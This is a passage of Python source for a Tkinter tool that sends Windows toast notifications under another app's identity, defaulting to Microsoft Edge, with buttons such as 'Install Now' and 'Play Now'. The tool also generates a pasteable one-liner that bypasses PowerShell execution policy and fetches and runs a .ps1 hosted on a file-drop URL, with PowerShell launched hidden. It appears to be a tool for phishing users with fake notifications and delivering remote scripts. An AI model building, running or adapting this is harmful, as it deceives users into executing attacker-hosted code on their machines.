        self._btn(fire_row, "⚡ SEND TEST TOAST", self._fire_inline, ACCENT, fg="#0e0e0f").pack(side="left", padx=(0, 8))
        self._btn(fire_row, "COPY RAW XML",       self._copy_xml,   BORDER, fg=TEXT   ).pack(side="left")

        tk.Label(frame, text="RAW XML", bg=PANEL, fg=MUTED, font=FONT_MONOB).pack(anchor="w", padx=12, pady=(4, 2))
        xml_frame = tk.Frame(frame, bg=PANEL)
        xml_frame.pack(fill="both", expand=True, padx=12, pady=(0, 12))
        self.xml_text = tk.Text(xml_frame, bg=DIM, fg=MUTED, font=FONT_SMALL,
                                relief="flat", wrap="none", state="disabled",
                                highlightthickness=0, height=14)
        sxy = ttk.Scrollbar(xml_frame, orient="vertical",   command=self.xml_text.yview)
        sxx = ttk.Scrollbar(xml_frame, orient="horizontal", command=self.xml_text.xview)
        self.xml_text.config(yscrollcommand=sxy.set, xscrollcommand=sxx.set)
        sxy.pack(side="right",  fill="y")
        sxx.pack(side="bottom", fill="x")
        self.xml_text.pack(fill="both", expand=True)
        return frame

    # AUMID helpers 

    def _populate_aumid_tree(self, rows):
        """rows: list of (name, aumid) or just aumid strings."""
        self.aumid_tree.delete(*self.aumid_tree.get_children())
        for item in rows:
            if isinstance(item, (list, tuple)) and len(item) == 2:
                self.aumid_tree.insert("", "end", values=(item[0], item[1]))
            else:
                self.aumid_tree.insert("", "end", values=("", str(item)))

    def _filter_aumids(self):
        q = self.aumid_filter_var.get().lower()
        source = self._live_aumids if self._live_aumids else FALLBACK_AUMIDS
        if not q:
            self._populate_aumid_tree(source)
            return
        filtered = [r for r in source
                    if q in str(r[0] if isinstance(r, tuple) else "").lower()
                    or q in str(r[1] if isinstance(r, tuple) else r).lower()]
        self._populate_aumid_tree(filtered)

    def _fetch_aumids_async(self):
        self.aumid_status.set("fetching from this machine…")
        def worker():
            try:
                result = subprocess.run(
                    ["powershell.exe", "-WindowStyle", "Hidden",
                     "-ExecutionPolicy", "Bypass", "-Command", PS_ENUM_AUMIDS],
                    capture_output=True, text=True, timeout=15,
                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
                )
                lines = [l.strip() for l in result.stdout.splitlines() if l.strip()]
                if lines:
                    self._live_aumids = [(l.split(".")[-1].split("_")[0], l) for l in lines]
                    self.after(0, lambda: self._populate_aumid_tree(self._live_aumids))
                    self.after(0, lambda: self.aumid_status.set(f"live — {len(lines)} AUMIDs fetched from registry + Start Menu"))
                else:
                    self.after(0, lambda: self.aumid_status.set("no results — showing static list"))
            except FileNotFoundError:
                self.after(0, lambda: self.aumid_status.set("powershell.exe not found — Windows only"))
            except subprocess.TimeoutExpired:
                self.after(0, lambda: self.aumid_status.set("timed out — showing static list"))
            except Exception as ex:
                self.after(0, lambda: self.aumid_status.set(f"error: {ex}"))
        threading.Thread(target=worker, daemon=True).start()

    # Helpers 

    def _btn(self, parent, text, cmd, bg, fg=TEXT):
        return tk.Button(parent, text=text, command=cmd,
                         bg=bg, fg=fg, font=FONT_MONOB,
                         relief="flat", padx=12, pady=6,
                         activebackground=BORDER, activeforeground=TEXT,
                         cursor="hand2", bd=0)

    def _refresh_fields(self):
        mode = self.mode.get()

        # Extras
        self.img_row.pack_forget()
        self.game_row.pack_forget()
        self.lbl_no_extra.pack_forget()
        if mode == "picture":
            self.img_row.pack(fill="x", pady=3)
        elif mode == "game":
            self.game_row.pack(fill="x", pady=3)
        elif mode == "all":
            self.img_row.pack(fill="x",  pady=3)
            self.game_row.pack(fill="x", pady=3)
        else:
            self.lbl_no_extra.pack(anchor="w", pady=3)

        # Action button rows — show only what's relevant to the mode
        self.row_open.pack_forget()
        self._open_pick_row.pack_forget()
        self.row_launch.pack_forget()
        self._launch_pick_row.pack_forget()
        self.row_update.pack_forget()
        self._update_pick_row.pack_forget()

        if mode in ("basic", "picture", "all"):
            self.row_open.pack(fill="x", pady=3)
            self._open_pick_row.pack(fill="x", pady=(0, 4))
        if mode in ("game", "all"):
            self.row_launch.pack(fill="x", pady=3)
            self._launch_pick_row.pack(fill="x", pady=(0, 4))
            self.row_update.pack(fill="x", pady=3)
            self._update_pick_row.pack(fill="x", pady=(0, 4))

    def _browse_image(self):
        path = filedialog.askopenfilename(
            title="Select image",
            filetypes=[("Images", "*.png *.jpg *.jpeg *.ico *.bmp"), ("All", "*.*")]
        )
        if path:
            self.v_image.set(path)

    def _write_text(self, widget, content):
        widget.config(state="normal")
        widget.delete("1.0", "end")
        widget.insert("1.0", content)
        widget.config(state="disabled")

    def _get_values(self):
        return {
            "use_sub":          self.v_use_sub.get(),
            "use_title":        self.v_use_title.get(),
            "use_message":      self.v_use_message.get(),
            "use_url":          self.v_use_url.get(),
            "use_open_label":   self.v_use_open_label.get(),
            "use_launch_label": self.v_use_launch_label.get(),
            "use_update_label": self.v_use_update_label.get(),
            "use_dismiss":      self.v_use_dismiss.get(),
            "sub":              real_value(self.e_sub,          ""),
            "title":            real_value(self.e_title,        "Notification"),
            "message":          real_value(self.e_message,      ""),
            "url":              real_value(self.e_url,          "https://example.com"),
            "aumid":            real_value(self.e_aumid,        "MSEdge"),
            "mode":             self.mode.get(),
            "image":            self.v_image.get(),
            "game":             self.v_game.get(),
            "open_label":       real_value(self.e_open_label,   "View Details"),
            "launch_label":     real_value(self.e_launch_label, "Play Now"),
            "update_label":     real_value(self.e_update_label, "Install Now"),
            "host":             real_value(self.e_host,         ""),
            "fname":            real_value(self.e_filename,     "n.ps1"),
        }

    # Actions 

    def _generate(self):
        v = self._get_values()
        self._write_text(self.tab_script[1], gen_universal(v))

        if v["host"]:
            fname = v["fname"]
            url   = v["host"]  # user pastes the full direct URL
            part1, part2, combined = gen_oneliner(url, fname)
            out = (
                "# ── STEP 1 — Unsigned execution policy (run once per machine) \n"
                "# Run this first, or paste as prefix in the combined line.\n"
                "# Only needed if the machine blocks unsigned scripts.\n\n"
                + part1 + "\n\n\n"
                "# ── STEP 2 — Grab and run (no args — values are baked into the .ps1) ─\n\n"
                + part2 + "\n\n\n"
                "# ── COMBINED (both steps in one cmd paste) \n\n"
                + combined + "\n"
            )
            self._write_text(self.tab_oneliner[1], out)
        else:
            self._write_text(self.tab_oneliner[1],
                "# Paste the full direct URL to your hosted .ps1 in ONE-LINER CONFIG\n"
                "# e.g. https://transfer.whalebone.io/XXXX/n.ps1\n"
                "# then hit GENERATE again.")

        self.toast_preview.update_preview(v)
        self._write_text(self.xml_text, build_preview_xml(v))
        self.status_var.set("generated.")

    def _save_script(self):
        v = self._get_values()
        path = filedialog.asksaveasfilename(
            defaultextension=".ps1",
            initialfile=v["fname"],
            filetypes=[("PowerShell", "*.ps1"), ("All", "*.*")]
        )
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(gen_universal(v))
            self.status_var.set(f"saved → {path}")

    def _copy_oneliner(self):
        v = self._get_values()
        if not v["host"]:
            self.status_var.set("  fill in the script URL under ONE-LINER CONFIG first.")
            return
        _, _, combined = gen_oneliner(v["host"], v["fname"])
        self.clipboard_clear()
        self.clipboard_append(combined)
        self.status_var.set("combined one-liner copied.")

    def _copy_xml(self):
        v = self._get_values()
        self.clipboard_clear()
        self.clipboard_append(build_preview_xml(v))
        self.status_var.set("raw xml copied.")

    def _fire_inline(self):
        v   = self._get_values()
        xml = build_preview_xml(v)
        aumid = v["aumid"] or "MSEdge"
        ps = (
            "Add-Type -AssemblyName System.Runtime.WindowsRuntime\n"
            "$null = [Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]\n"
            "$null = [Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]\n"
            "$xml = @\"\n"
            + xml + "\n"
            "\"@\n"
            "$doc = New-Object Windows.Data.Xml.Dom.XmlDocument\n"
            "$doc.LoadXml($xml)\n"
            "$toast = [Windows.UI.Notifications.ToastNotification]::new($doc)\n"
            f"$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier(\"{aumid}\")\n"
            "$notifier.Show($toast)\n"
        )
        try:
            subprocess.Popen(
                ["powershell.exe", "-WindowStyle", "Hidden",
                 "-ExecutionPolicy", "Bypass", "-Command", ps],
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            )
            self.status_var.set(f"⚡ fired as {aumid}")
        except FileNotFoundError:
            self.status_var.set("powershell.exe not found — Windows only.")
        except Exception as ex:
            self.status_var.set(f"error: {ex}")

    def _open_notif_settings(self):
        try:
            subprocess.Popen(
                ["powershell.exe", "-Command", "Start-Process 'ms-settings:notifications'"],
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            )
            self.status_var.set("opened ms-settings:notifications")
        except FileNotFoundError:
            self.status_var.set("windows only.")

    def _open_url(self, url):
        try:
            subprocess.Popen(
                ["powershell.exe", "-Command", f"Start-Process '{url}'"],
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            )
        except Exception:
            pass


if __name__ == "__main__":
    App().mainloop()
